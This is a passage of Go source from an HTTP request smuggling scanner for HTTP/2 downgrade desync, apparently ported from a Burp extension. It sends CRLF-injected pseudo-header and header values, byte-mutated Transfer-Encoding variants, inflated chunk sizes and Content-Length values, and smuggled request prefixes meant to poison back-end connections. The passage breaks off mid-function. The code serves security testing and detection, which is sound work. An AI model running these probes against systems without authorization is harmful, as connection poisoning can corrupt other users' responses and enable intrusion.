package scan

// h2.go — HTTP/2 downgrade desync detection
//
// Maps to HTTP2Scan.java, H2TunnelScan.java, HiddenHTTP2.java.
//
// Strategy:
// When a front-end accepts HTTP/2 and downgrades to HTTP/1.1 for the back-end,
// H2-specific headers or header injection can smuggle a request that the back-end
// sees as a second, separate HTTP/1.1 request.
//
// We use Go's net/http with HTTP/2 forced via h2c or TLS-ALPN, then craft
// requests with injected newlines in header values (H2.TE, H2.CL).
//
// Note: true H2 framing with injected CRLF in header values requires
// a custom HPACK encoder — here we approximate via golang.org/x/net/http2
// and test the most reliable downgrade vectors.

import (
	"github.com/smuggled/smuggled/internal/permute"
	"github.com/smuggled/smuggled/internal/request"
	"github.com/smuggled/smuggled/internal/config"
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/smuggled/smuggled/internal/report"
)

// ScanH2Downgrade probes for HTTP/2 → HTTP/1.1 downgrade desync vectors.
func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2Downgrade")
	if target.Scheme != "https" {
		rep.Log("H2Downgrade: skipping non-HTTPS target %s", target.Host)
		return
	}

	rep.Log("H2Downgrade probe: %s", target.Host)

	// First check if server supports HTTP/2
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2Downgrade: %s does not advertise h2 via ALPN, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()
	port := target.Port()
	if port == "" {
		port = "443"
	}

	// ── H2.TE: chunk-size inflation attack ──────────────────────────────────
	//
	// Mirrors HTTP2Scan.java exactly:
	//   syncedReq  = makeChunked(original, 0, 0,  config, false)  // correct chunk size
	//   attackReq  = makeChunked(original, 0, 10, config, false)  // chunk size inflated +10
	//
	// The attack body declares chunk size = bodySize + 10 but only provides
	// bodySize bytes of data. The back-end (TE) reads the declared size,
	// finds insufficient data, and waits for the remaining bytes → TIMEOUT.
	//
	// CL = full body length in BOTH cases (NO truncation). In H2 the front-end
	// uses DATA frames (not CL) to delimit the body, so CL truncation has no
	// effect. The attack relies solely on the inflated chunk size.
	const h2TEChunkData = "x=y"
	const h2TEChunkOffset = 10

	// Attack body: chunk declares 13 bytes but only 3 available
	//   "d\r\nx=y\r\n0\r\n\r\n"
	// Back-end reads "d" (13), reads 3 bytes "x=y", reads "\r\n0\r\n\r\n" (7 bytes)
	// as chunk data → still needs 3 more bytes → waits → TIMEOUT
	attackChunkSize := len(h2TEChunkData) + h2TEChunkOffset // 13
	h2TEAttackBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", attackChunkSize, h2TEChunkData)

	// Synced body: chunk size matches actual data → processes normally
	//   "3\r\nx=y\r\n0\r\n\r\n"
	syncedChunkSize := len(h2TEChunkData) // 3
	h2TESyncedBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", syncedChunkSize, h2TEChunkData)

	// h2TEProbe represents one downgrade technique.
	//
	// Most techniques use h2RawRequest via extraHeaders — the caller passes a
	// map of header name → value and h2RawRequest writes each as a separate
	// HPACK field (AllowIllegalWrites lets CRLF pass through for pseudo-header
	// injection variants). extraHeaders may include pseudo-header overrides
	// (:method, :path, :authority) as well as regular headers.
	//
	// Two "legacy" techniques (dualchunk / revdualchunk) embed two TE values
	// inside a single HPACK field value — Go maps can't hold duplicate keys, so
	// they use the legacy h2RequestWithInjectedHeader path instead.
	// For these, lHdr/lVal hold the header name and the CRLF-embedded value.
	type h2TEProbe struct {
		name       string
		extra      map[string]string // extraHeaders for h2RawRequest path
		legacy     bool              // true → use h2RequestWithInjectedHeader
		lHdr       string            // legacy: header name
		lVal       string            // legacy: header value (may contain \r\n)
		suppressCL bool             // omit content-length header entirely
	}

	// Build the comprehensive technique list.
	// Matches all ~65 techniques tested by Burp's HTTP2Scan.java.
	var teProbes []h2TEProbe

	// ── Group A: clean H2 headers (h2RawRequest) ──────────────────────────

	// vanilla: plain transfer-encoding: chunked — the most fundamental test.
	// If the front-end passes TE to the back-end during H2→H1 downgrade,
	// the inflated chunk size causes timeout.
	teProbes = append(teProbes, h2TEProbe{
		name:  "H2.TE-vanilla",
		extra: map[string]string{"transfer-encoding": "chunked"},
	})

	// http2case: lowercase :method with TE — tests case-sensitivity of front-end
	// H2→H1 normalisation. Some front-ends lowercase method but uppercase it on
	// the back-end; the extra content-length: 0 is a CL.0 amplifier.
	teProbes = append(teProbes, h2TEProbe{
		name: "H2.TE-http2case",
		extra: map[string]string{
			":method":           "post",
			":authority":        "",
			"content-length":    "0",
			"transfer-encoding": "chunked",
		},
	})

	// Dynamic byte-mutation families — match Burp's suffix1, prefix1, namesuffix1.
	// specialChars (exported as SpecialChars) includes 0x00 for H2 NUL variants.
	for _, i := range permute.SpecialChars() {
		b := string([]byte{byte(i)})

		// suffix1: transfer-encoding: chunked<byte>   (byte appended to value)
		teProbes = append(teProbes, h2TEProbe{
			name:  fmt.Sprintf("H2.TE-suffix1:%d", i),
			extra: map[string]string{"transfer-encoding": "chunked" + b},
		})

		// prefix1: transfer-encoding: <byte>chunked   (byte prepended to value)
		teProbes = append(teProbes, h2TEProbe{
			name:  fmt.Sprintf("H2.TE-prefix1:%d", i),
			extra: map[string]string{"transfer-encoding": b + "chunked"},
		})

		// namesuffix1: transfer-encoding<byte>: chunked  (byte appended to name)
		teProbes = append(teProbes, h2TEProbe{
			name:  fmt.Sprintf("H2.TE-namesuffix1:%d", i),
			extra: map[string]string{"transfer-encoding" + b: "chunked"},
		})

		// h2namefuse: transfer-encoding<byte>chunked: (empty value)
		// Distinct from namesuffix1 — the byte is fused *between* the header name
		// and the word "chunked", making the full name "transfer-encoding<byte>chunked"
		// with an empty value. Some H2 servers/proxies split on the byte, recovering
		// a valid TE header on the back-end.
		teProbes = append(teProbes, h2TEProbe{
			name:  fmt.Sprintf("H2.TE-h2namefuse:%d", i),
			extra: map[string]string{"transfer-encoding" + b + "chunked": ""},
		})
	}

	// ── Pseudo-header injection techniques ──────────────────────────────────
	// These inject Transfer-Encoding via CRLF embedded in :authority, :method,
	// or :path. When the H2 front-end constructs the H1 request line / Host header
	// from pseudo-headers, the injected CRLF creates an extra H1 header.

	// h2auth: inject TE via :authority  (→ Host: <host>\r\nTransfer-Encoding: chunked)
	teProbes = append(teProbes, h2TEProbe{
		name: "H2.TE-h2auth",
		extra: map[string]string{
			":authority": fmt.Sprintf("%s:%s\r\nTransfer-Encoding: chunked\r\nx: x", host, port),
		},
	})

	// h2method: inject TE via :method  (→ GET / HTTP/1.1\r\nTransfer-Encoding: chunked)
	teProbes = append(teProbes, h2TEProbe{
		name: "H2.TE-h2method",
		extra: map[string]string{
			":method": fmt.Sprintf("POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x"),
		},
	})

	// h2path: inject TE via :path  (→ / HTTP/1.1\r\nTransfer-Encoding: chunked)
	teProbes = append(teProbes, h2TEProbe{
		name: "H2.TE-h2path",
		extra: map[string]string{
			":path": fmt.Sprintf("%s HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x", path),
		},
	})

	// ── Group B: CRLF in a single header value (legacy path) ───────────────
	// dualchunk: two TE headers fused in one HPACK value via CRLF.
	// revdualchunk: reversed order. Both require the legacy sender because
	// Go maps cannot hold duplicate keys.

	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-dualchunk",
		legacy: true,
		lHdr:   "transfer-encoding",
		lVal:   "chunked\r\nTransfer-Encoding: chunked",
	})
	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-revdualchunk",
		legacy: true,
		lHdr:   "transfer-encoding",
		lVal:   "chunked\r\nTransfer-Encoding: identity",
	})

	// http2hide: inject TE via a generic header value — Burp uses "foo: b\r\nTE"
	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-http2hide",
		legacy: true,
		lHdr:   "foo",
		lVal:   fmt.Sprintf("b\r\nTransfer-Encoding: chunked\r\nx: x"),
	})

	// Legacy CRLF variants that existed before the refactor — kept for parity.
	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-crlf",
		legacy: true,
		lHdr:   "transfer-encoding",
		lVal:   "chunked\r\nTransfer-Encoding: chunked",
	})
	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-lf",
		legacy: true,
		lHdr:   "transfer-encoding",
		lVal:   "chunked\nTransfer-Encoding: chunked",
	})
	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-CL-inject",
		legacy: true,
		lHdr:   "transfer-encoding",
		lVal:   "0\r\nContent-Length: 99",
	})
	teProbes = append(teProbes, h2TEProbe{
		name:   "H2.TE-host-inject",
		legacy: true,
		lHdr:   "transfer-encoding",
		lVal:   fmt.Sprintf("%s\r\nTransfer-Encoding: chunked", host),
	})

	timeoutThreshold := time.Duration(float64(cfg.Timeout) * request.TimeoutRatio)

	// Append no-CL variants for every technique.
	// In HTTP/2 the DATA frame already delimits the body (RFC 9113 §8.1.2.6),
	// so content-length is redundant. Sending CL + TE:chunked together can cause
	// HTTP/2-strict servers (e.g. Cloudflare) to reject the request at the H2 layer
	// before any downgrade happens — suppressing CL lets the TE reach the back-end.
	withCL := teProbes
	noCL := make([]h2TEProbe, len(withCL))
	for i, p := range withCL {
		p.name += "-noCL"
		p.suppressCL = true
		noCL[i] = p
	}
	teProbes = append(teProbes, noCL...)

	dbg(cfg, "H2.TE synced body: %q (%d bytes)", h2TESyncedBody, len(h2TESyncedBody))
	dbg(cfg, "H2.TE attack body: %q (%d bytes), declared chunk=%d actual=%d",
		h2TEAttackBody, len(h2TEAttackBody), attackChunkSize, len(h2TEChunkData))
	dbg(cfg, "H2.TE timeout threshold: %v (ratio=%.2f of %v)", timeoutThreshold, request.TimeoutRatio, cfg.Timeout)
	dbg(cfg, "H2.TE total techniques: %d (%d with-CL + %d no-CL)", len(teProbes), len(withCL), len(noCL))

	// h2TESend dispatches to the correct sender.
	//   extra path  → h2RawRequest with probe.extra as extraHeaders
	//   legacy path → h2RequestWithInjectedHeader (CRLF embedded in value)
	h2TESend := func(probe h2TEProbe, body string) ([]byte, int, time.Duration, error) {
		if probe.legacy {
			clOverride := ""
			if probe.suppressCL {
				clOverride = "suppress"
			}
			return h2RequestWithInjectedHeader(target, path, host,
				probe.lHdr, probe.lVal, cfg, body, clOverride)
		}
		extra := probe.extra
		if probe.suppressCL {
			// Build a copy of extra with content-length suppressed.
			// Passing "" as the value triggers the suppressCL path in h2RawRequest.
			merged := make(map[string]string, len(probe.extra)+1)
			for k, v := range probe.extra {
				merged[k] = v
			}
			merged["content-length"] = "" // "" → suppressCL=true in h2RawRequest
			extra = merged
		}
		start := time.Now()
		resp, err := h2RawRequest(target, "POST", path, host, body, extra, cfg)
		elapsed := time.Since(start)
		if err != nil {
			return nil, 0, elapsed, err
		}
		return resp.Body, resp.Status, elapsed, nil
	}

	for _, tech := range teProbes {
		rep.Log("H2Downgrade: technique=%s", tech.name)
		if tech.legacy {
			dbg(cfg, "H2.TE [%s] legacy header: %s: %q", tech.name, tech.lHdr, tech.lVal)
		} else {
			dbg(cfg, "H2.TE [%s] extra: %v", tech.name, tech.extra)
		}

		// ── Step 1: Synced baseline ─────────────────────────────────────────
		syncedResp, syncedStatus, syncedElapsed, syncedErr := h2TESend(tech, h2TESyncedBody)
		if syncedErr != nil {
			rep.Log("H2Downgrade %s: synced request error: %v", tech.name, syncedErr)
			dbg(cfg, "H2.TE [%s] SYNCED → ERROR: %v", tech.name, syncedErr)
			continue
		}
		dbg(cfg, "H2.TE [%s] SYNCED → elapsed=%v status=%d resp_len=%d",
			tech.name, syncedElapsed, syncedStatus, len(syncedResp))
		if syncedElapsed > timeoutThreshold {
			dbg(cfg, "H2.TE [%s] SYNCED timed out (%v > %v) — skipping", tech.name, syncedElapsed, timeoutThreshold)
			continue
		}

		// ── Step 2: Attack probe (inflated chunk size) ──────────────────────
		resp, attackStatus, elapsed, err := h2TESend(tech, h2TEAttackBody)
		if err != nil {
			rep.Log("H2Downgrade %s: attack error: %v", tech.name, err)
			dbg(cfg, "H2.TE [%s] ATTACK → ERROR: %v", tech.name, err)
			continue
		}
		dbg(cfg, "H2.TE [%s] ATTACK → elapsed=%v status=%d resp_len=%d timeout=%v",
			tech.name, elapsed, attackStatus, len(resp), elapsed > timeoutThreshold)
		if len(resp) > 0 {
			dbg(cfg, "H2.TE [%s] ATTACK resp body (first 200): %q", tech.name, string(resp[:min(200, len(resp))]))
		}

		// Construct probe string for reporting (best-effort representation)
		probeHdr := ""
		if tech.legacy {
			probeHdr = fmt.Sprintf("%s: %s", tech.lHdr, tech.lVal)
		} else {
			for k, v := range tech.extra {
				probeHdr += fmt.Sprintf("%s: %s\r\n", k, v)
			}
		}
		probeStr := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%scontent-length: %d\r\n\r\n%s",
			path, host, probeHdr, len(h2TEAttackBody), h2TEAttackBody)

		// v10a: timeout-based or delay-based detection
		delayed := cfg.IsDelayed(elapsed)
		if elapsed > timeoutThreshold || delayed {
			// Confirm synced still works
			_, _, syncedElapsed2, _ := h2TESend(tech, h2TESyncedBody)
			if syncedElapsed2 > timeoutThreshold {
				rep.Log("H2Downgrade %s: synced also timed out on retry — FP, skipping", tech.name)
				continue
			}
			// Confirm attack reproduces
			_, _, attackElapsed2, _ := h2TESend(tech, h2TEAttackBody)
			if attackElapsed2 <= timeoutThreshold {
				rep.Log("H2Downgrade %s: attack did not reproduce — flaky, skipping", tech.name)
				continue
			}

			// FP validation: broken TE name.
			//
			// For techniques that inject Transfer-Encoding as a direct header key
			// (e.g. vanilla, suffix1), we remove "transfer-encoding" and add
			// "zransfer-encoding" instead.
			//
			// For techniques that inject TE via CRLF embedded in a pseudo-header
			// VALUE (h2auth, h2method, h2path), the extra map key is ":authority",
			// ":method" or ":path" — delete("transfer-encoding") is a no-op and
			// the real injection survives, so the broken-TE also times out and
			// incorrectly triggers the "probably FP" label.
			//
			// Fix: also replace "Transfer-Encoding:" → "zransfer-encoding:" inside
			// all header VALUES so CRLF-injected TE is broken regardless of which
			// field carries it.
			fpLabel := ""
			brokenTech := tech
			if tech.legacy {
				brokenTech.lHdr = "zransfer-encoding"
			} else {
				brokenExtra := make(map[string]string, len(tech.extra)+1)
				for k, v := range tech.extra {
					// Break any CRLF-injected Transfer-Encoding hidden in a header value
					// (covers h2auth / h2method / h2path pseudo-header injection).
					v = strings.ReplaceAll(v, "Transfer-Encoding:", "zransfer-encoding:")
					v = strings.ReplaceAll(v, "transfer-encoding:", "zransfer-encoding:")
					brokenExtra[k] = v
				}
				// Also handle the case where TE is a plain header key.
				delete(brokenExtra, "transfer-encoding")
				brokenExtra["zransfer-encoding"] = "chunked"
				brokenTech.extra = brokenExtra
			}
			_, _, brokenElapsed, brokenErr := h2TESend(brokenTech, h2TEAttackBody)
			if brokenErr == nil && brokenElapsed > timeoutThreshold {
				fpLabel = " (probably FP)"
				rep.Log("H2Downgrade %s: broken-TE also timed out — probable FP", tech.name)
			}

			// Contamination check: only when broken-TE is clean (genuine TE-specific signal).
			//
			// We send a properly-terminated chunked body that appends a smuggled HTTP/1.1
			// request prefix after the final chunk (0\r\n\r\n). The H1 back-end processes
			// the chunked body cleanly, then treats the suffix as the start of a new request.
			// A follow-up GET we send immediately after lands on the same back-end H1
			// connection and receives the response to our smuggled GET instead of its own.
			//
			// Detection: follow-up status diverges from clean GET baseline, or the canary
			// path appears in the follow-up body (error page reflecting the smuggled path).
			contaminationConfirmed := false
			contaminationEvidence := ""
			if fpLabel == "" {
				canaryPath := config.EffectiveCanaryPath(cfg)
				smuggledPrefix := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nFoo: ", canaryPath, host)
				// Body: correct chunk (terminates cleanly) + final chunk + smuggled request prefix.
				contaminationBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n%s",
					syncedChunkSize, h2TEChunkData, smuggledPrefix)

				// Establish a clean GET baseline for comparison.
				contBase, contBaseErr := h2RawRequest(target, "GET", path, host, "", nil, cfg)
				if contBaseErr == nil && contBase != nil && contBase.Status != 0 {
					dbg(cfg, "H2.TE [%s] contamination baseline status=%d", tech.name, contBase.Status)
					for attempt := 0; attempt < cfg.Attempts && !contaminationConfirmed; attempt++ {
						// Poison: send the attack with the smuggled suffix.
						_, _, _, _ = h2TESend(tech, contaminationBody)

						// Follow-up: should receive the smuggled response if poisoned.
						followup, followupErr := h2RawRequest(target, "GET", path, host, "", nil, cfg)
						if followupErr != nil || followup == nil {
							dbg(cfg, "H2.TE [%s] contamination attempt=%d followup error: %v",
								tech.name, attempt, followupErr)
							continue
						}
						dbg(cfg, "H2.TE [%s] contamination attempt=%d followup_status=%d base=%d canary_in_body=%v",
							tech.name, attempt, followup.Status, contBase.Status,
							request.ContainsStr(followup.Body, canaryPath))

						if h2CLPoisonDetected(contBase, followup, canaryPath) {
							contaminationConfirmed = true
							contaminationEvidence = fmt.Sprintf(
								"attempt=%d canary=%s followup_status=%d base_status=%d canary_reflected=%v",
								attempt, canaryPath, followup.Status, contBase.Status,
								request.ContainsStr(followup.Body, canaryPath))
							rep.Log("H2Downgrade %s: contamination confirmed (attempt %d)", tech.name, attempt)
						}
					}
				}
			}

			// v10a confirmed: synced OK on retry + attack reproduced + broken-TE clean.
			// Classified as CRITICAL when the broken-TE check passes (fpLabel == ""),
			// because the timeout is genuinely TE-specific (3 independent verifications).
			// Demoted to MEDIUM when broken-TE also times out — likely infrastructure noise.
			// When contamination is additionally confirmed, the description is upgraded.
			sev := report.SeverityConfirmed
			if fpLabel != "" {
				sev = report.SeverityInfo
			}
			desc := fmt.Sprintf("H2.TE desync v10a: H2 request with inflated chunk size "+
				"(declared %d, actual %d) caused timeout while synced request succeeded. "+
				"The back-end is processing Transfer-Encoding from the downgraded H1 request.",
				attackChunkSize, len(h2TEChunkData))
			if contaminationConfirmed {
				desc += " Contamination confirmed: follow-up request received the smuggled " +
					"response, proving the back-end connection was poisoned."
			}
			evidence := fmt.Sprintf("elapsed=%v attack_chunk=%d synced_ok=true technique=%s",
				elapsed, attackChunkSize, tech.name)
			if contaminationConfirmed {
				evidence += " contamination=" + contaminationEvidence
			}
			rep.Emit(report.Finding{
				Target:      target.String(),
				Method:      "HTTP/2",
				Severity:    sev,
				Type:        "H2.TE",
				Technique:   tech.name + fpLabel,
				Description: desc,
				Evidence:    evidence,
				RawProbe:    probeStr,
			})
			if cfg.ExitOnFind {
				return
			}
			continue
		}

		// v10b: connection failure detection.
		// "Genuine failure" = attack probe received no HEADERS frame (status == 0).
		// An empty body alone is NOT sufficient — legitimate 204/304/etc responses
		// have empty bodies but non-zero status.
		if attackStatus == 0 && elapsed < timeoutThreshold {
			_, syncedStatus2, _, syncedErr2 := h2TESend(tech, h2TESyncedBody)
			if syncedErr2 != nil || syncedStatus2 == 0 {
				dbg(cfg, "H2.TE [%s] v10b: synced also fails (status=%d) → not TE-specific",
					tech.name, syncedStatus2)
				continue
			}
			_, attackStatus2, _, _ := h2TESend(tech, h2TEAttackBody)
			if attackStatus2 != 0 {
				dbg(cfg, "H2.TE [%s] v10b: attack failure didn't reproduce (status=%d)",
					tech.name, attackStatus2)
				continue
			}

			rep.Emit(report.Finding{
				Target:    target.String(),
				Method:    "HTTP/2",
				Severity:  report.SeverityConfirmed,
				Type:      "H2.TE",
				Technique: tech.name,
				Description: fmt.Sprintf("H2.TE desync v10b: H2 request with inflated chunk size "+
					"(declared %d, actual %d) caused connection failure while synced request succeeded.",
					attackChunkSize, len(h2TEChunkData)),
				Evidence: fmt.Sprintf("response_empty=true attack_chunk=%d synced_ok=true technique=%s",
					attackChunkSize, tech.name),
				RawProbe: probeStr,
			})
			if cfg.ExitOnFind {
				return
			}
			continue
		}

		// Secondary check: back-end error strings in body.
		// Gate: only fire when attackStatus differs from syncedStatus.
		// If both requests return the same error code (e.g. both 400), the server
		// is rejecting the TE:chunked header at the H2 layer regardless of chunk
		// size — the suspicious body text is not TE-specific and firing here would
		// be a false positive (e.g. Cloudflare returning "400 Bad Request" for any
		// H2 request that carries Transfer-Encoding).
		if h2BodySuspicious(resp) && attackStatus != syncedStatus {
			rep.Emit(report.Finding{
				Target:      target.String(),
				Method:      "HTTP/2",
				Severity:    report.SeverityConfirmed,
				Type:        "H2.TE",
				Technique:   tech.name,
				Description: "H2→H1 downgrade with injected TE caused back-end rejection — possible desync",
				Evidence: fmt.Sprintf("elapsed=%v synced_status=%d attack_status=%d h2_body_suspicious=true",
					elapsed, syncedStatus, attackStatus),
				RawProbe:    probeStr,
				RawResponse: request.Truncate(string(resp), 256),
			})
			if cfg.ExitOnFind {
				return
			}
		}
	}

	// H2.CL: inject a Content-Length that conflicts with the actual body length
	h2CLDesync(target, path, host, cfg, rep)
}

// h2RequestWithInjectedHeader sends a raw HTTP/2 request with a header whose
// value contains injected CRLF or newline sequences to test for H2→H1 downgrade.
// Returns only the DATA frame body (not HPACK header bytes) and the elapsed time.
//
// body and clOverride allow callers to set a custom DATA frame body and
// Content-Length header. When empty, defaults to body="x=y" / CL="3".
func h2RequestWithInjectedHeader(target *url.URL, path, host, headerName, headerValue string, cfg config.Config, body string, clOverride string) ([]byte, int, time.Duration, error) {
	addr := target.Hostname() + ":443"
	if p := target.Port(); p != "" {
		addr = target.Hostname() + ":" + p
	}

	tlsCfg := &tls.Config{
		ServerName:         target.Hostname(),
		InsecureSkipVerify: cfg.SkipTLSVerify, //nolint:gosec
		NextProtos:         []string{"h2"},
	}

	netDialer := &net.Dialer{Timeout: cfg.Timeout}
	rawConn, err := tls.DialWithDialer(netDialer, "tcp", addr, tlsCfg)
	if err != nil {
		return nil, 0, 0, fmt.Errorf("tls dial: %w", err)
	}
	defer rawConn.Close()

	if rawConn.ConnectionState().NegotiatedProtocol != "h2" {
		return nil, 0, 0, fmt.Errorf("server did not negotiate h2")
	}

	// Write HTTP/2 client preface
	rawConn.SetDeadline(time.Now().Add(cfg.Timeout)) //nolint:errcheck
	if _, err := rawConn.Write([]byte(http2.ClientPreface)); err != nil {
		return nil, 0, 0, err
	}

	framer := http2.NewFramer(rawConn, rawConn)
	framer.AllowIllegalWrites = true
	framer.AllowIllegalReads = true

	// Send SETTINGS frame
	if err := framer.WriteSettings(); err != nil {
		return nil, 0, 0, err
	}

	// Encode HEADERS with injected value
	var headersBuf bytes.Buffer
	enc := hpack.NewEncoder(&headersBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	// Default body/CL when not overridden.
	// "suppress" sentinel: omit content-length entirely (RFC 9113 §8.1.2.6 —
	// in HTTP/2 the DATA frame already delimits the body, CL is redundant).
	if body == "" {
		body = "x=y"
	}
	suppressLegacyCL := clOverride == "suppress"
	cl := clOverride
	if !suppressLegacyCL && cl == "" {
		cl = fmt.Sprintf("%d", len(body))
	}

	enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/x-www-form-urlencoded"})
	// Omit CL when suppressed (no-CL variant) or when the injected header IS
	// content-length — emitting two content-length fields violates RFC 7540
	// §8.1.2.6 and most H2 servers reject with PROTOCOL_ERROR.
	if !suppressLegacyCL && headerName != "content-length" {
		enc.WriteField(hpack.HeaderField{Name: "content-length", Value: cl})
	}
	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "identity"})
	// Inject the malformed/override header
	enc.WriteField(hpack.HeaderField{Name: headerName, Value: headerValue, Sensitive: false})

	clLog := cl
	if suppressLegacyCL {
		clLog = "(suppressed)"
	}
	dbg(cfg, "  h2Inject: sending HEADERS+DATA — %s: %q, body=%q (%d bytes), CL=%s",
		headerName, headerValue, body, len(body), clLog)

	start := time.Now()

	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: headersBuf.Bytes(),
		EndStream:     false,
		EndHeaders:    true,
	}); err != nil {
		return nil, 0, 0, err
	}

	// Send DATA frame with body
	if err := framer.WriteData(1, true, []byte(body)); err != nil {
		return nil, 0, 0, err
	}

	// Read response frames — only collect DATA frame body, skip HPACK header bytes.
	// Must ACK server's SETTINGS frame (RFC 7540 §6.5) — without this, strict H2
	// servers send GOAWAY(SETTINGS_TIMEOUT) before processing any request.
	var dataBuf bytes.Buffer
	var respStatus string
	hpackDec := hpack.NewDecoder(4096, nil)
	// Note: rawConn.SetDeadline above already bounds the total time. Per-frame
	// deadlines would mask H2.TE timeout signals as "empty response" — rely on
	// the connection deadline instead.
	deadline := time.Now().Add(cfg.Timeout)
	for time.Now().Before(deadline) {
		frame, err := framer.ReadFrame()
		if err != nil {
			dbg(cfg, "  h2Inject: read frame error after %v: %v", time.Since(start), err)
			break
		}
		switch f := frame.(type) {
		case *http2.DataFrame:
			dataBuf.Write(f.Data())
			dbg(cfg, "  h2Inject: [DATA stream=%d len=%d end=%v]",
				f.StreamID, len(f.Data()), f.StreamEnded())
			if f.StreamEnded() {
				goto done
			}
		case *http2.HeadersFrame:
			if fields, decErr := hpackDec.DecodeFull(f.HeaderBlockFragment()); decErr == nil {
				for _, hf := range fields {
					if hf.Name == ":status" {
						respStatus = hf.Value
					}
					dbg(cfg, "  h2Inject: [HEADER] %s: %s", hf.Name, hf.Value)
				}
			}
			if f.StreamEnded() {
				goto done
			}
		case *http2.RSTStreamFrame:
			dbg(cfg, "  h2Inject: [RST_STREAM stream=%d code=%v] after %v", f.StreamID, f.ErrCode, time.Since(start))
			goto done
		case *http2.GoAwayFrame:
			dbg(cfg, "  h2Inject: [GOAWAY last_stream=%d code=%v] after %v", f.LastStreamID, f.ErrCode, time.Since(start))
			goto done
		case *http2.SettingsFrame:
			if !f.IsAck() {
				framer.WriteSettingsAck() //nolint:errcheck
				dbg(cfg, "  h2Inject: [SETTINGS ACK sent]")
			}
		case *http2.WindowUpdateFrame:
			// ignore silently
		default:
			dbg(cfg, "  h2Inject: [%T]", frame)
		}
	}
done:
	elapsed := time.Since(start)
	statusInt := 0
	if respStatus != "" {
		fmt.Sscanf(respStatus, "%d", &statusInt)
	}
	return dataBuf.Bytes(), statusInt, elapsed, nil
}

// h2BodySuspicious checks whether an H2 DATA frame body contains back-end error strings
// that indicate the injected header caused a parsing error on the downgraded H1 connection.
func h2BodySuspicious(body []byte) bool {
	body = bytes.ToLower(body)
	suspects := [][]byte{
		[]byte("unrecognised"),
		[]byte("invalid method"),
		[]byte("bad request"),
		[]byte("gpost"),
		[]byte("malformed"),
		[]byte("invalid header"),
	}
	for _, s := range suspects {
		if bytes.Contains(body, s) {
			return true
		}
	}
	return false
}

// h2CLDesync tests for H2.CL desync where CL in an H2 request conflicts with actual body.
//
// Two complementary detection strategies:
//
// Strategy A — CL=0 smuggling (classic H2.CL):
//   Send H2 POST with content-length: 0 but the DATA frame contains a smuggled
//   HTTP/1.1 request to a canary path. The H2 front-end ignores CL (uses frames),
//   but when downgrading to H1 it forwards the body. The H1 back-end reads CL=0
//   (no body), so the remaining bytes become the next request → pipeline poisoning.
//   Detection: send follow-up requests and check if any gets the canary response.
//
// Strategy B — inflated CL timeout:
//   Send H2 POST with content-length: 99 but only 3 bytes in the DATA frame.
//   The H1 back-end reads CL=99 and waits for 96 more bytes → timeout.
func h2CLDesync(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("h2CLDesync")

	// ── Strategy A: CL=0 smuggling with follow-up poisoning detection ────────
	h2CLSmuggle(target, path, host, cfg, rep)

	// ── Strategy B: inflated CL timeout ──────────────────────────────────────
	stratBCfg := cfg.WithDebugScope("StrategyB.inflatedCL")
	probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\ncontent-type: application/x-www-form-urlencoded\r\ncontent-length: 99\r\n\r\nx=y", path, host)

	resp, _, elapsed, err := h2RequestWithInjectedHeader(target, path, host,
		"content-length", "99", stratBCfg, "", "")
	if err != nil {
		return
	}

	h2clDelayed := cfg.IsDelayed(elapsed)
	if elapsed > time.Duration(float64(cfg.Timeout)*request.TimeoutRatio) || h2clDelayed {
		rep.Emit(report.Finding{
			Target:      target.String(),
			Method:      "HTTP/2",
			Severity:    report.SeverityProbable,
			Type:        "H2.CL",
			Technique:   "H2.CL-mismatch",
			Description: "H2 request with inflated Content-Length caused timeout/delay — possible H2.CL desync",
			Evidence:    fmt.Sprintf("elapsed=%v delayed=%v threshold=%v", elapsed, h2clDelayed, cfg.DelayThreshold),
			RawProbe:    probe,
			RawResponse: request.Truncate(string(resp), 256),
		})
	}
}

// h2CLSmuggle implements the classic H2.CL smuggling attack:
//   1. Send H2 POST with content-length: 0 and body = smuggled HTTP/1.1 request.
//   2. The H2 front-end sends the body in a DATA frame (H2 ignores CL).
//   3. When downgraded to H1, back-end reads CL=0 → no body → the body bytes
//      remain in the back-end connection buffer as the start of the next request.
//   4. Follow-up requests that hit the same back-end connection get the smuggled
//      request's response instead of their own → confirmed H2.CL desync.
func h2CLSmuggle(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("h2CLSmuggle")
	rep.Log("H2.CL smuggle probe (CL=0): target=%s", host)

	// Get baseline response status for comparison
	baselineCfg := cfg.WithDebugScope("baseline")
	baseline, err := h2RawRequest(target, "GET", path, host, "", nil, baselineCfg)
	if err != nil || baseline.Status == 0 {
		return
	}
	dbg(cfg, "baseline status=%d body_len=%d", baseline.Status, len(baseline.Body))

	canaryPath := config.EffectiveCanaryPath(cfg)

	// The smuggled body: a complete HTTP/1.1 request to the canary path.
